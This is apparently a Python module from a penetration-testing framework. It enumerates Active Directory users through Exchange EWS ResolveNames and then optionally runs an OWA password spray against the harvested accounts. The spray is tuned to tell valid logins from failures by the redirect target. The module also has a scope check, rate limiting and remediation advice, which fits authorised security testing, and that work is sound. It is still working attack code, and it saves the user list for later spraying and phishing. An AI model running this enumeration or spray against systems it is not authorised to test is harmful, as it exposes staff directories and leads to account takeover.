"""EWS Global Address List enumeration — dump AD users via Exchange Web Services.

EWS ResolveNames with SearchScope=ActiveDirectory returns full AD user objects
(name, email, job title, department) to any authenticated domain user. This
technique requires only port 443 to Exchange — no LDAP (389) or Kerberos (88)
needed, making it viable even when traditional AD ports are firewalled.

Also handles OWA password spray with reliable success/failure differentiation:
  - Success: HTTP 302 → /owa/ inbox
  - Failure: HTTP 302 → /owa/auth/logon.aspx?reason=2
"""
from __future__ import annotations

import asyncio
import re
import sys
import time
from pathlib import Path
from typing import Any

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

CVSS_GAL_ENUM   = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
CVSS40_GAL_ENUM = "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"
CVSS_OWA_SPRAY  = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
CVSS40_OWA_SPRAY = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"

# EWS SOAP envelope for ResolveNames — iterates name prefix A-Z.
# SearchScope=ActiveDirectory returns full AD objects, not just Exchange mailboxes.
EWS_RESOLVE_NAMES = """\
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope
    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
    xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
    xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
  <soap:Body>
    <m:ResolveNames ReturnFullContactData="true" SearchScope="ActiveDirectory">
      <m:UnresolvedEntry>{prefix}</m:UnresolvedEntry>
    </m:ResolveNames>
  </soap:Body>
</soap:Envelope>"""

EWS_ENDPOINT = "/ews/exchange.asmx"
OWA_AUTH_PATH = "/owa/auth.owa"

# Standard Latin prefixes A-Z; callers can extend with locale-specific prefixes.
LATIN_PREFIXES = list("ABCDEFGHIJKLMNOPQRSTUVWXYZ")

# Regex to extract user fields from EWS ResolveNamesResponse XML.
_NAME_RE       = re.compile(r"<t:Name>([^<]+)</t:Name>")
_EMAIL_RE      = re.compile(r"<t:EmailAddress>([^<]+)</t:EmailAddress>")
_TITLE_RE      = re.compile(r"<t:JobTitle>([^<]+)</t:JobTitle>")
_DEPT_RE       = re.compile(r"<t:Department>([^<]+)</t:Department>")
_NO_ERROR_RE   = re.compile(r"<m:ResponseCode>NoError</m:ResponseCode>")

# OWA spray outcome detection.
OWA_SUCCESS_RE = re.compile(r"Location:.*?/owa/(?!auth/logon)", re.IGNORECASE)
OWA_FAILURE_RE = re.compile(r"logon\.aspx\?reason=2", re.IGNORECASE)


class EwsGalEnum(BaseModule):
    """Exchange EWS Global Address List enumeration and OWA spray helper.

    Requires config.extra:
      - "username":  domain\\user or user@domain  (any low-privilege account)
      - "password":  domain account password
      - "domain":    NETBIOS domain name (used for NTLM / OWA form POST)
      - "ews_host":  Exchange server hostname (defaults to config.target)
      - "prefixes":  optional list of additional name prefixes beyond A-Z

    Optional spray mode (set config.extra["spray"] = True):
      - "spray_users":    list of usernames to spray
      - "spray_password": single password to try
    """

    NAME        = "ews_gal_enum"
    DESCRIPTION = "Enumerate AD users via Exchange EWS GAL; OWA spray with success/failure detection"
    PHASE       = 2
    TAGS        = ["unauth", "enum", "exchange", "ews", "ad", "mitre-T1087.002"]

    async def run(self) -> ModuleResult:
        start    = time.monotonic()
        username = self.config.extra.get("username", "")
        password = self.config.extra.get("password", "")
        domain   = self.config.extra.get("domain", "")
        ews_host = self.config.extra.get("ews_host", "") or self.config.target
        extra_prefixes: list[str] = self.config.extra.get("prefixes", [])

        if not self.check_scope(ews_host):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        if not (username and password):
            self.log.info("No EWS credentials provided — skipping GAL enumeration")
            return self._make_result(start, skipped=True, skip_reason="no credentials")

        ews_url = f"https://{ews_host.rstrip('/').removeprefix('https://').removeprefix('http://')}{EWS_ENDPOINT}"
        prefixes = LATIN_PREFIXES + [p for p in extra_prefixes if p not in LATIN_PREFIXES]

        self.log.info("Starting EWS GAL enumeration against %s (%d prefixes)", ews_url, len(prefixes))

        users: dict[str, dict[str, str]] = {}
        sem = asyncio.Semaphore(3)

        async def _fetch_prefix(prefix: str) -> None:
            await self.rate_limit()
            result = await self._ews_resolve(ews_url, username, password, domain, prefix, sem)
            for user in result:
                email = user.get("email", "")
                if email and email not in users:
                    users[email] = user

        await asyncio.gather(*[_fetch_prefix(p) for p in prefixes], return_exceptions=True)

        if not users:
            self.log.info("EWS GAL enumeration returned no results")
            return self._make_result(start)

        user_list = sorted(users.values(), key=lambda u: u.get("email", ""))
        user_summary = "\n".join(
            f"  • {u.get('name', '?')} <{u.get('email', '?')}>"
            + (f" — {u['title']}" if u.get("title") else "")
            for u in user_list[:20]
        )
        if len(user_list) > 20:
            user_summary += f"\n  … and {len(user_list) - 20} more"

        # Store for other modules (password spray, phishing, etc.)
        self.config.extra["domain_users_ews"] = user_list

        ev = Evidence(
            request_raw=f"POST {ews_url}\nSOAP ResolveNames SearchScope=ActiveDirectory prefix=A..Z",
            response_raw=user_summary,
            extra={
                "total_users": len(user_list),
                "sample":      user_list[:10],
                "ews_host":    ews_host,
            },
        )
        self.new_finding(
            title=f"EWS GAL Enumeration — {len(user_list)} Domain Users Extracted",
            severity=Severity.HIGH,
            description=(
                f"Exchange Web Services ResolveNames (SearchScope=ActiveDirectory) at {ews_url} "
                f"returned {len(user_list)} domain user objects using a single low-privilege "
                "credential. No LDAP or Kerberos port access was required.\n\n"
                f"Sample results:\n{user_summary}"
            ),
            reproduction_steps=[
                f"curl --ntlm -u '{domain}\\\\<user>:<pass>' -X POST {ews_url}",
                "-H 'Content-Type: text/xml'",
                "--data-raw '<SOAP ResolveNames SearchScope=ActiveDirectory UnresolvedEntry=A>'",
                "Iterate A-Z plus locale-specific name prefixes. Deduplicate by email.",
            ],
            remediation=(
                "Restrict EWS access to internal network or VPN only. "
                "Require MFA on all Exchange/OWA accounts. "
                "Disable EWS for accounts that do not need programmatic access "
                "(Set-CASMailbox -Identity user -EwsEnabled $false)."
            ),
            references=["CWE-200", "OWASP A01:2021", "MITRE T1087.002"],
            evidence=ev,
            cvss_v31_vector=CVSS_GAL_ENUM,
            cvss_v40_vector=CVSS40_GAL_ENUM,
            mitre_attack=["TA0007/T1087.002"],
            target=ews_host,
            url=ews_url,
        )

        # Optional OWA spray
        if self.config.extra.get("spray"):
            spray_users    = self.config.extra.get("spray_users", [u.get("email", "") for u in user_list])
            spray_password = self.config.extra.get("spray_password", "")
            if spray_users and spray_password:
                owa_base = f"https://{ews_host.rstrip('/').removeprefix('https://').removeprefix('http://')}"
                await self._owa_spray(owa_base, domain, spray_users[:50], spray_password)

        return self._make_result(start)

    # ── EWS helpers ──────────────────────────────────────────────────────────

    async def _ews_resolve(
        self,
        ews_url: str,
        username: str,
        password: str,
        domain: str,
        prefix: str,
        sem: asyncio.Semaphore,
    ) -> list[dict[str, str]]:
        """Send one EWS ResolveNames request and parse results."""
        async with sem:
            try:
                import aiohttp
                body = EWS_RESOLVE_NAMES.format(prefix=prefix).encode()
                ntlm_user = f"{domain}\\{username}" if domain and "\\" not in username and "@" not in username else username
                auth = aiohttp.BasicAuth(ntlm_user, password)
                async with aiohttp.ClientSession(
                    connector=aiohttp.TCPConnector(ssl=False),
                ) as session:
                    async with session.post(
                        ews_url,
                        data=body,
                        headers={"Content-Type": "text/xml; charset=utf-8"},
                        auth=auth,
                        timeout=aiohttp.ClientTimeout(total=20),
                        allow_redirects=False,
                    ) as resp:
                        if resp.status not in (200, 207):
                            return []
                        xml = await resp.text(errors="ignore")
                return self._parse_resolve_response(xml)
            except Exception as exc:
                self.log.debug("EWS prefix=%s failed: %s", prefix, exc)
                return []

    @staticmethod
    def _parse_resolve_response(xml: str) -> list[dict[str, str]]:
        """Extract user dicts from EWS ResolveNamesResponse XML."""
        if not _NO_ERROR_RE.search(xml):
            return []
        users: list[dict[str, str]] = []
        names  = _NAME_RE.findall(xml)
        emails = _EMAIL_RE.findall(xml)
        titles = _TITLE_RE.findall(xml)
        depts  = _DEPT_RE.findall(xml)
        for i, email in enumerate(emails):
            users.append({
                "name":  names[i]  if i < len(names)  else "",
                "email": email,
                "title": titles[i] if i < len(titles) else "",
                "dept":  depts[i]  if i < len(depts)  else "",
            })
        return users

    # ── OWA spray helper ─────────────────────────────────────────────────────

    async def _owa_spray(
        self,
        owa_base: str,
        domain: str,
        users: list[str],
        password: str,
    ) -> None:
        """Slow OWA password spray with reliable success/failure detection.

        Exchange OWA response differentiation:
          - Success: HTTP 302 Location → /owa/ (inbox)
          - Failure: HTTP 302 Location → /owa/auth/logon.aspx?reason=2

        Rate: 1 attempt per account per call (caller controls cadence).
        """
        owa_url = f"{owa_base}{OWA_AUTH_PATH}"
        valid: list[str] = []

        try:
            import aiohttp
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
                for user in users:
                    await self.rate_limit()
                    try:
                        form = {
                            "destination":    f"{owa_base}/owa/",
                            "flags":          "4",
                            "forcedownlevel": "0",
                            "username":       f"{domain}\\{user}" if domain else user,
                            "password":       password,
                            "passwordText":   "",
                            "isUtf8":         "1",
                        }
                        async with session.post(
                            owa_url,
                            data=form,
                            headers={"Content-Type": "application/x-www-form-urlencoded"},
                            allow_redirects=False,
                            timeout=aiohttp.ClientTimeout(total=15),
                        ) as resp:
                            location = resp.headers.get("Location", "")
                            if resp.status == 302:
                                if OWA_FAILURE_RE.search(location):
                                    continue
                                if "/owa/" in location and "logon" not in location:
                                    valid.append(user)
                                    self.log.warning("OWA credential valid: %s", user)
                    except Exception as exc:
                        self.log.debug("OWA spray %s failed: %s", user, exc)
        except Exception as exc:
            self.log.debug("OWA spray session error: %s", exc)

        if valid:
            ev = Evidence(
                request_raw=f"POST {owa_url}",
                response_raw=f"Valid accounts: {', '.join(valid)}",
                extra={"valid_accounts": valid, "password_used": "REDACTED"},
            )
            self.new_finding(
                title=f"OWA Password Spray — {len(valid)} Valid Credential(s) Found",
                severity=Severity.CRITICAL,
                description=(
                    f"OWA password spray against {owa_url} found {len(valid)} account(s) "
                    f"with the tested password. Success detected via HTTP 302 redirect to "
                    "/owa/ inbox (vs logon.aspx?reason=2 for failures).\n\n"
                    f"Valid accounts: {', '.join(valid)}"
                ),
                reproduction_steps=[
                    f"POST {owa_url}",
                    "body: destination=<owa_base>/owa/&flags=4&username=DOMAIN\\user&password=<pass>&isUtf8=1",
                    "Success = 302 → /owa/; Failure = 302 → logon.aspx?reason=2",
                ],
                remediation=(
                    "Enforce MFA on all Exchange OWA and EWS access. "
                    "Implement account lockout policy. "
                    "Restrict OWA to VPN or internal network. "
                    "Deploy Conditional Access policies."
                ),
                references=["CWE-307", "CWE-287", "OWASP A07:2021", "MITRE T1110.003"],
                evidence=ev,
                cvss_v31_vector=CVSS_OWA_SPRAY,
                cvss_v40_vector=CVSS40_OWA_SPRAY,
                mitre_attack=["TA0001/T1110.003", "TA0006/T1078.002"],
                target=owa_base,
                url=owa_url,
            )
